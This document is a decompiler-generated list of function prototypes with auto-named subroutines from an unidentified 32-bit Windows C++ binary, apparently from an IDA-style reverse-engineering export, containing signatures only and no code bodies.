unsigned int __thiscall sub_1003F365(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1003F3D7(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1003F3FF(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1003F410(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_1003F46D(_DWORD *this);
int *__thiscall sub_1003F523(int *this, int *a2);
void *__thiscall sub_1003F565(_DWORD *this);
int __thiscall sub_1003F5C6(_DWORD *this);
char __thiscall sub_1003F5CA(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_1003F65A(int *this, int a2);
int __thiscall sub_1003F672(_DWORD *this, unsigned int a2);
int __thiscall sub_1003F6FD(_DWORD *this, int a2);
int __thiscall sub_1003F71C(_DWORD *this, int a2);
char *__thiscall sub_1003F73B(_DWORD *this, char *a2);
int __thiscall sub_1003F761(int *this);
BOOL __thiscall sub_1003F788(void *this);
int __thiscall sub_1003F793(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1003F801(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1003F87D(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1003F8A5(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1003F8B6(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_1003F977(_DWORD *this);
_DWORD *__stdcall sub_1003FA98(_DWORD *a1);
void *__thiscall sub_1003FAE1(_DWORD *this);
bool __thiscall sub_1003FB33(_DWORD *this, _DWORD *a2);
char __thiscall sub_1003FB6A(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003FBB7(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003FC37(_DWORD *this, _DWORD *pExceptionObject);
_DWORD *__thiscall sub_1003FC8C(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003FCC4(_DWORD *this, _DWORD *a2);
int __thiscall sub_1003FCFC(_DWORD *this, int a2);
int __thiscall sub_1003FD14(_DWORD *this);
int __thiscall sub_1003FD28(_DWORD *this);
_DWORD *__stdcall sub_1003FD30(_DWORD *a1);
int *__thiscall sub_1003FD74(int *this, int *a2);
void *__thiscall sub_1003FDB6(_DWORD *this);
int __thiscall sub_1003FE17(_DWORD *this);
_DWORD *__thiscall sub_1003FE1B(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1003FE81(int *this, int a2);
int __thiscall sub_1003FE99(_DWORD *this, unsigned int a2);
int __thiscall sub_1003FEF0(_DWORD *this, int a2);
int __thiscall sub_1003FF0E(_DWORD *this, int a2);
char *__thiscall sub_1003FF2C(_DWORD *this, char *a2);
int __thiscall sub_1003FF52(int *this);
BOOL __thiscall sub_1003FF79(void *this);
int __thiscall sub_1003FF84(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1003FFCE(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10040040(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10040068(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10040079(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_10040129(_DWORD *this);
// _DWORD *__userpurge sub_1004023F@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10040283(void *this);
// _DWORD *__usercall sub_100402BC@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// _DWORD *__usercall sub_100402E4@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
_DWORD *__stdcall sub_10040308(_DWORD *a1);
int *__thiscall sub_10040340(int *this, int *a2);
void *__thiscall sub_10040382(_DWORD *this);
int __thiscall sub_100403E3(_DWORD *this);
_DWORD *__thiscall sub_100403E7(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1004044D(int *this, int a2);
int __thiscall sub_10040465(_DWORD *this, unsigned int a2);
int __thiscall sub_100404BC(_DWORD *this, int a2);
int __thiscall sub_100404DA(_DWORD *this, int a2);
char *__thiscall sub_100404F8(_DWORD *this, char *a2);
int __thiscall sub_1004051E(int *this);
BOOL __thiscall sub_10040545(void *this);
int __thiscall sub_10040550(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1004059A(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1004060C(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10040634(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10040645(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_100406F5(_DWORD *this);
// _DWORD *__usercall sub_1004080B@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
void __thiscall sub_1004081F(void *this);
_DWORD *__stdcall sub_1004085B(_DWORD *a1);
int *__thiscall sub_10040898(int *this, int *a2);
void *__thiscall sub_100408DA(_DWORD *this);
int __thiscall sub_1004093B(_DWORD *this);
_DWORD *__thiscall sub_1004093F(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_100409A5(int *this, int a2);
int __thiscall sub_100409BD(_DWORD *this, unsigned int a2);
int __thiscall sub_10040A14(_DWORD *this, int a2);
int __thiscall sub_10040A32(_DWORD *this, int a2);
char *__thiscall sub_10040A50(_DWORD *this, char *a2);
int __thiscall sub_10040A76(int *this);
BOOL __thiscall sub_10040A9D(void *this);
int __thiscall sub_10040AA8(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10040AF2(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10040B64(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10040B8C(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10040B9D(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_10040C4D(_DWORD *this);
// _DWORD *__userpurge sub_10040D77@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10040DBB(void *this);
// _DWORD *__userpurge sub_10040E0E@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10040E52(void *this);
// _DWORD *__userpurge sub_10040E91@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10040ED5(void *this);
// _DWORD *__userpurge sub_10040F22@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10040F66(void *this);
// _DWORD *__userpurge sub_10040FB9@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10040FFD(void *this);
// _DWORD *__userpurge sub_10041050@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10041094(void *this);
// _DWORD *__userpurge sub_100410E7@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1004112B(void *this);
// _DWORD *__userpurge sub_1004117E@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100411C2(void *this);
// _DWORD *__userpurge sub_10041215@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10041259(void *this);
// _DWORD *__userpurge sub_100412AC@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100412F0(void *this);
// _DWORD *__userpurge sub_10041343@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10041387(void *this);
void *__thiscall sub_100413C6(void *Block, char a2);
_DWORD *__thiscall sub_100413E2(_DWORD *Block, char a2);
int __thiscall sub_100413FE(void *this);
_DWORD *__thiscall sub_10041407(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10041423(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1004143F(_DWORD *this);
_DWORD *__thiscall sub_10041449(_DWORD *Block, char a2);
// char *__usercall sub_10041465@<eax>(char *a1@<eax>);
_DWORD *__thiscall sub_10041483(_DWORD *this);
_DWORD *__thiscall sub_1004148F(_DWORD *Block, char a2);
// char *__usercall sub_100414AB@<eax>(char *a1@<eax>);
_DWORD *__thiscall sub_100414C9(_DWORD *this);
_DWORD *__stdcall sub_100414D5(_DWORD *a1);
_DWORD *__stdcall sub_10041504(_DWORD *a1);
_DWORD *__stdcall sub_10041543(_DWORD *a1);
_DWORD *__stdcall sub_10041572(_DWORD *a1);
// void __usercall sub_100415B9(int a1@<esi>);
// _DWORD *__usercall sub_100415E1@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
// _DWORD *__userpurge sub_1004163D@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10041691(_DWORD *a1);
// _DWORD *__userpurge sub_100416D3@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10041727(_DWORD *a1);
// int __userpurge sub_1004176B@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// void __usercall sub_100417EC(_DWORD *a1@<edi>, unsigned int a2@<esi>);
// void __usercall sub_1004186B(int a1@<esi>);
// void __usercall sub_10041893(_DWORD *a1@<edi>);
// _DWORD *__userpurge sub_10041905@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__usercall sub_10041949@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_10041980(int a1@<esi>);
// void __usercall sub_100419A8(_DWORD *a1@<edi>, unsigned int a2@<esi>);
// void __usercall sub_10041A27(int a1@<esi>);
// void __usercall sub_10041A61(int a1@<esi>);
// void __usercall sub_10041A89(int a1@<esi>);
// void __usercall sub_10041AC3(int a1@<esi>);
// void __usercall sub_10041AFD(int a1@<esi>);
// void __usercall sub_10041B37(int a1@<esi>);
// void __usercall sub_10041B71(int a1@<esi>);
// void __usercall sub_10041BAB(int a1@<esi>);
// void __usercall sub_10041BE5(int a1@<esi>);
// void __usercall sub_10041C1F(int a1@<esi>);
// void __usercall sub_10041C59(int a1@<esi>);
_DWORD *__stdcall sub_10041C81(_DWORD *a1);
_DWORD *__stdcall sub_10041CB0(_DWORD *a1);
// void *__usercall sub_10041CE9@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
// void __usercall sub_10041D09(_DWORD *a1@<edi>, unsigned int a2@<esi>);
_DWORD *__stdcall sub_10041DEE(_DWORD *a1);
void __stdcall sub_10041E22(_DWORD *a1);
_DWORD *__thiscall sub_10041E46(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10041E63(_DWORD *a1);
void *__stdcall sub_10041E8A(int a1);
_DWORD *__stdcall sub_10041EAE(_DWORD *a1, int a2);
// int __userpurge sub_10041EEA@<eax>(int a1@<esi>, DWORD dwMilliseconds);
_DWORD *__stdcall sub_10041F75(_DWORD *a1);
void __thiscall sub_10041FA8(_DWORD *this);
_DWORD *__stdcall sub_10041FCC(_DWORD *a1);
void __thiscall sub_10041FFF(_DWORD *this);
_DWORD *__thiscall sub_10042023(_DWORD *this, int a2);
_DWORD *__thiscall sub_1004205B(_DWORD *this, int a2);
_DWORD *__thiscall sub_10042093(_DWORD *this, int a2);
_DWORD *__thiscall sub_100420CB(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100420E7(_DWORD *Block, char a2);
int __thiscall sub_10042103(void *this, char a2);
_DWORD *__thiscall sub_1004214A(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100421A7(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10042204(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10042269(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100422CE(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1004234D(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_100423CC(_DWORD *this);
int *__thiscall sub_100423F6(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10042469(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_100424DC(void *this, int a2);
void __thiscall sub_1004251A(void *this, int a2, int a3);
void __thiscall sub_1004255B(void *this, int a2);
int __thiscall sub_10042599(void *this, int a2);
int __thiscall sub_100425DD(void *this, int a2);
void __thiscall sub_10042621(void *this);
_DWORD *__thiscall sub_10042676(_DWORD *Block, char a2);
// int __usercall sub_100426D1@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10042711@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10042742(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1004277A(_DWORD *this);
bool __thiscall sub_100427A4(int this);
BOOL __thiscall sub_100427BB(_DWORD *this);
int __thiscall sub_100427C5(int this);
int __thiscall sub_10042800(int this);
int __thiscall sub_10042836(_DWORD *this);
int __thiscall sub_1004285E(int this);
int __thiscall sub_10042899(int this, int a2);
_DWORD *__thiscall sub_100428B2(void *this, _DWORD *a2, int a3);
void *__thiscall sub_100428EA(_DWORD *this);
bool __thiscall sub_10042914(int this);
BOOL __thiscall sub_1004292B(_DWORD *this);
int __thiscall sub_10042935(int this);
int __thiscall sub_10042970(int this);
int __thiscall sub_100429A6(_DWORD *this);
int __thiscall sub_100429CE(int this);
int __thiscall sub_10042A09(int this, int a2);
_DWORD *__thiscall sub_10042A22(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10042A3E(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10042A78(_DWORD *a1);
void **__thiscall sub_10042AB0(void **this, void **a2);
void *__thiscall sub_10042AEF(int this);
int __thiscall sub_10042B4D(_DWORD *this);
int __thiscall sub_10042B51(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10042BAC(int *this, int a2);
int __thiscall sub_10042BC4(_DWORD *this, unsigned int a2);
int __thiscall sub_10042C0D(_DWORD *this, int a2);
int __thiscall sub_10042C2B(_DWORD *this, int a2);
void __thiscall sub_10042C49(_DWORD *this, unsigned int a2);
int __thiscall sub_10042C6B(void **this);
BOOL __thiscall sub_10042C8F(void *this);
int __thiscall sub_10042C9A(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10042CD9(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10042D4B(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10042D73(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10042D84(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_10042DE1(_DWORD *this);
// _DWORD *__userpurge sub_10042EAB@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10042EEF(void *this);
// _DWORD *__userpurge sub_10042F42@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10042F86(void *this);
void *__thiscall sub_10042FC5(void *Block, char a2);
_DWORD *__stdcall sub_10042FE1(_DWORD *a1);
// void *__usercall sub_10043010@<eax>(_DWORD *a1@<esi>);
// void __usercall sub_10043045(int a1@<esi>);
// void __usercall sub_1004307F(int a1@<esi>);
// unsigned int *__userpurge sub_100430C9@<eax>(unsigned __int16 a1@<bx>, unsigned int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100431CB(int *Block, char a2);
LONG __thiscall sub_100431E7(int *this);
int __thiscall sub_10043297(int *this, int a2);
void __thiscall sub_10043379(int *this, int a2, int a3);
int __thiscall sub_1004340E(int this);
void __stdcall sub_1004351E(int a1);
_DWORD *__stdcall sub_1004367F(int *a1);
// unsigned int __usercall sub_1004370A@<eax>(int a1@<eax>);
__int16 __thiscall sub_10043739(void *this, int a2);
char __thiscall sub_10043867(char *this, int a2, int a3);
// __int16 __usercall sub_100438B9@<ax>(int a1@<eax>);
_DWORD *__thiscall sub_100438FE(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004395B(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100439B8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10043A1D(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10043A82(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_10043B01(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_10043B80(_DWORD *this);
int *__thiscall sub_10043BAA(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10043C1D(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10043C90(void *this, int a2);
void __thiscall sub_10043CCE(void *this, int a2, int a3);
void __thiscall sub_10043D0F(void *this, int a2);
int __thiscall sub_10043D4D(void *this, int a2);
int __thiscall sub_10043D91(void *this, int a2);
void __thiscall sub_10043DD5(void *this);
_DWORD *__thiscall sub_10043E2A(_DWORD *Block, char a2);
// int __usercall sub_10043E85@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10043EC5@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10043EF6(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10043F2E(_DWORD *this);
bool __thiscall sub_10043F58(int this);
BOOL __thiscall sub_10043F6F(_DWORD *this);
int __thiscall sub_10043F79(int this);
int __thiscall sub_10043FB4(int this);
int __thiscall sub_10043FEA(_DWORD *this);
int __thiscall sub_10044012(int this);
int __thiscall sub_1004404D(int this, int a2);
_DWORD *__thiscall sub_10044066(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1004409E(_DWORD *this);
bool __thiscall sub_100440C8(int this);
BOOL __thiscall sub_100440DF(_DWORD *this);
int __thiscall sub_100440E9(int this);
int __thiscall sub_10044124(int this);
int __thiscall sub_1004415A(_DWORD *this);
int __thiscall sub_10044182(int this);
int __thiscall sub_100441BD(int this, int a2);
_DWORD *__thiscall sub_100441D6(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100441F2(_DWORD *Block, char a2);
// _DWORD *__usercall sub_1004423C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__stdcall sub_10044269(_DWORD *a1, unsigned int a2);
int *__thiscall sub_100442B2(int *this, int *a2);
void *__thiscall sub_100442F4(_DWORD *this);
int __thiscall sub_10044355(_DWORD *this);
char __thiscall sub_10044359(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_100443E9(int *this, int a2);
int __thiscall sub_10044401(_DWORD *this, unsigned int a2);
int __thiscall sub_1004448C(_DWORD *this, int a2);
int __thiscall sub_100444AB(_DWORD *this, int a2);
char *__thiscall sub_100444CA(_DWORD *this, char *a2);
int __thiscall sub_100444F0(int *this);
BOOL __thiscall sub_10044517(void *this);
int __thiscall sub_10044522(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10044590(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_1004460C(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10044634(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10044645(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_10044706(_DWORD *this);
_DWORD *__stdcall sub_10044827(_DWORD *a1);
// _DWORD *__usercall sub_10044837@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
_DWORD *__stdcall sub_10044867(_DWORD *a1);
void __thiscall sub_10044882(void *this);
// _DWORD *__usercall sub_100448BE@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
void __thiscall sub_100448D2(void *this);
// _DWORD *__userpurge sub_10044925@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10044969(void *this);
// _DWORD *__userpurge sub_100449BC@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10044A00(void *this);
_DWORD *__thiscall sub_10044A3F(_DWORD *Block, char a2);
int __thiscall sub_10044A6F(void *this);
// char *__usercall sub_10044A78@<eax>(char *a1@<eax>);
_DWORD *__stdcall sub_10044A96(_DWORD *a1);
_DWORD *__thiscall sub_10044AC5(_DWORD *this);
// void __usercall sub_10044B23(_DWORD *a1@<edi>, unsigned int a2@<esi>);
_DWORD *__thiscall sub_10044B90(_DWORD *this);
_DWORD *__thiscall sub_10044BEE(_DWORD *this);
// void __usercall sub_10044C3A(int a1@<esi>);
// _DWORD *__userpurge sub_10044C62@<eax>(_DWORD *a1@<esi>, int a2);
// void __usercall sub_10044CB8(int a1@<esi>);
// void __usercall sub_10044CF2(int a1@<esi>);
// void __usercall sub_10044D2C(int a1@<esi>);
// BSTR **__userpurge sub_10044D97@<eax>(BSTR **a1@<edi>, const CHAR *a2);
// BSTR *__userpurge sub_10044DE9@<eax>(BSTR *a1@<esi>, const CHAR *a2);
// int __usercall sub_10044E7A@<eax>(OLECHAR ***a1@<eax>, int a2@<esi>);
// VARIANTARG *__usercall sub_10044EB9@<eax>(LONG a1@<eax>, VARIANTARG *a2@<esi>);
int __stdcall sub_10044EED(VARIANTARG *pvarg);
// int __usercall sub_10044F0C@<eax>(int *a1@<esi>);
// _DWORD *__userpurge sub_10044F33@<eax>(_DWORD *a1@<edx>, int *a2@<ebx>, _DWORD *a3);
int __thiscall sub_10045021(_DWORD *this);
_DWORD *__thiscall sub_10045025(_DWORD *this, _DWORD *a2);
int __thiscall sub_1004509D(_DWORD *this);
int __thiscall sub_100450A1(_DWORD *this);
_DWORD *__stdcall sub_100450A5(_DWORD *a1, int a2);
_DWORD *__thiscall sub_100450F8(_DWORD *Block, char a2);
int __thiscall sub_1004511B(_DWORD *this);
_DWORD *__thiscall sub_1004515A(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_100451D4(_DWORD *this, int a2);
_DWORD *__stdcall sub_10045282(_DWORD *a1, int a2);
_DWORD *__thiscall sub_100452D5(_DWORD *Block, char a2);
int __thiscall sub_100452F8(_DWORD *this);
_DWORD *__thiscall sub_10045337(_DWORD *this, _DWORD *a2);
int *__thiscall sub_100453AF(_DWORD *this, int *a2, int a3);
int __thiscall sub_10045456(void *this, int a2, volatile LONG *lpAddend, int *a4, unsigned __int16 pExceptionObject);
_DWORD *__stdcall sub_10045850(_DWORD *a1, int a2);
_DWORD *__thiscall sub_100458F8(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1004591B(_DWORD *a1, int a2, int a3, int a4);
int __thiscall sub_1004599B(_DWORD *this);
char __cdecl sub_100459EE(int a1, int *a2);
_DWORD *__stdcall sub_10045BD0(_DWORD *a1, int a2, int a3);
_DWORD *__thiscall sub_10045C5E(_DWORD *Block, char a2);
int __thiscall sub_10045C81(_DWORD *this);
bool __thiscall sub_10045CC0(DWORD *this);
int *__thiscall sub_10045D0F(int **this, int *a2);
// int __usercall sub_10045ED2@<eax>(int *a1@<esi>);
// _DWORD *__userpurge sub_10045EF9@<eax>(int *a1@<edx>, int *a2@<ebx>, _DWORD *a3, _DWORD *a4);
// _DWORD *__userpurge sub_10045F63@<eax>(_DWORD *a1@<edx>, int *a2@<ebx>, _DWORD *a3);
// _DWORD *__userpurge sub_10045FC1@<eax>(int *a1@<esi>, _DWORD *a2);
// _DWORD *__usercall sub_10046065@<eax>(int *a1@<eax>, _DWORD *a2@<esi>);
// int __usercall sub_10046083@<eax>(int a1@<esi>);
// int __usercall sub_100460F2@<eax>(int a1@<esi>);
_DWORD *__thiscall sub_1004615E(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100461BB(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10046218(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004627D(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100462E2(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_10046361(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_100463E0(_DWORD *this);
int *__thiscall sub_1004640A(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1004647D(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_100464F0(void *this, int a2);
void __thiscall sub_1004652E(void *this, int a2, int a3);
void __thiscall sub_1004656F(void *this, int a2);
int __thiscall sub_100465AD(void *this, int a2);
int __thiscall sub_100465F1(void *this, int a2);
void __thiscall sub_10046635(void *this);
_DWORD *__thiscall sub_10046709(_DWORD *Block, char a2);
// int __usercall sub_100467F3@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10046833@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_1004688B(void *this, _DWORD *a2, int a3);
void *__thiscall sub_100468C3(_DWORD *this);
bool __thiscall sub_100468ED(int this);
BOOL __thiscall sub_10046904(_DWORD *this);
int __thiscall sub_1004690E(int this);
int __thiscall sub_10046949(int this);
int __thiscall sub_1004697F(_DWORD *this);
int __thiscall sub_100469A7(int this);
int __thiscall sub_100469E2(int this, int a2);
_DWORD *__thiscall sub_100469FB(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10046A33(_DWORD *this);
bool __thiscall sub_10046A5D(int this);
BOOL __thiscall sub_10046A74(_DWORD *this);
int __thiscall sub_10046A7E(int this);
int __thiscall sub_10046AB9(int this);
int __thiscall sub_10046AEF(_DWORD *this);
int __thiscall sub_10046B17(int this);
int __thiscall sub_10046B52(int this, int a2);
_DWORD *__thiscall sub_10046B6B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10046B87(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_10046BD8@<eax>(_DWORD *a1@<esi>, int a2);
_DWORD *__stdcall sub_10046C1F(_DWORD *a1);
int *__thiscall sub_10046C57(int *this, int *a2);
void *__thiscall sub_10046C99(_DWORD *this);
int __thiscall sub_10046CFA(_DWORD *this);
_DWORD *__thiscall sub_10046CFE(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_10046D64(int *this, int a2);
int __thiscall sub_10046D7C(_DWORD *this, unsigned int a2);
int __thiscall sub_10046DD3(_DWORD *this, int a2);
int __thiscall sub_10046DF1(_DWORD *this, int a2);
char *__thiscall sub_10046E0F(_DWORD *this, char *a2);
int __thiscall sub_10046E35(int *this);
BOOL __thiscall sub_10046E5C(void *this);
int __thiscall sub_10046E67(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10046EB1(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10046F23(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_10046F4B(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10046F5C(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_1004700C(_DWORD *this);
// int *__userpurge sub_10047132@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// int *__userpurge sub_10047187@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// int *__userpurge sub_100471EC@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// int *__userpurge sub_10047241@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
int *__thiscall sub_100472A6(int *this, int *a2, int *a3);
// int *__userpurge sub_1004730A@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
int *__thiscall sub_1004735F(int *this, int *a2, int *a3);
// _DWORD *__userpurge sub_100473C3@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10047417(_DWORD *a1);
// int *__userpurge sub_1004745B@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// _DWORD *__userpurge sub_100474C4@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10047508(void *this);
// _DWORD *__userpurge sub_1004755B@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1004759F(void *this);
_DWORD *__thiscall sub_100475DE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100475FA(_DWORD *this);
_DWORD *__stdcall sub_10047668(_DWORD *a1);
// _DWORD *__usercall sub_10047737@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// void __usercall sub_1004775C(_DWORD *a1@<edi>);
int __thiscall sub_100477CE(int *this, int a2);
int __thiscall sub_1004784A(int *this, int a2);
int __thiscall sub_100478C6(int *this, int a2);
int __thiscall sub_10047942(int *this, int a2);
int __thiscall sub_100479BE(int *this, int a2);
int __thiscall sub_10047A3A(int *this, int a2);
int __thiscall sub_10047AB6(int *this, int a2);
int __thiscall sub_10047B32(int *this, int a2);
// void __usercall sub_10047BC0(int a1@<esi>);
// void __usercall sub_10047BFA(int a1@<esi>);
// int __usercall sub_10047C22@<eax>(int a1@<esi>);
// int *__usercall sub_10047C6C@<eax>(int *a1@<esi>);
// int __userpurge sub_10047C82@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_10047C9D@<eax>(int *a1@<esi>);
// int __userpurge sub_10047CB3@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_10047CCE@<eax>(int *a1@<esi>);
// int __userpurge sub_10047CE4@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_10047CFF@<eax>(int *a1@<esi>);
// int __userpurge sub_10047D15@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_10047D30@<eax>(int *a1@<esi>);
// int __userpurge sub_10047D46@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_10047D61@<eax>(int *a1@<esi>);
// int __userpurge sub_10047D77@<eax>(_DWORD *a1@<esi>, int a2);
_DWORD *__stdcall sub_10047E1D(_DWORD *a1);
_DWORD *__thiscall sub_10047E90(_DWORD *Block, char a2);
bool __thiscall sub_10047EAC(_DWORD *this);
BOOL __cdecl sub_10047EE6(void *Buf1, void *Buf2);
// VARIANTARG *__usercall sub_10047F15@<eax>(VARIANTARG *result@<eax>);
int __thiscall sub_10047F56(_DWORD *this);
int __stdcall sub_10047F5A(int a1, _DWORD *a2);
int __stdcall sub_10047F78(int a1, int a2, int a3, int a4);
int __stdcall sub_10047F80(int a1, int a2, int a3, int a4, int a5, int a6);
int __stdcall sub_10047F88(int a1, int a2, int pExceptionObject);
char *__thiscall sub_10048130(char *Block, char a2);
int __thiscall sub_10048153(char *this);
HRESULT __thiscall sub_100481E4(int this);
int __stdcall sub_1004831D(int a1);
int __stdcall sub_10048332(volatile LONG *a1);
int __stdcall sub_10048358(int a1, void *a2, _DWORD *a3);
int __stdcall sub_1004839C(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9);
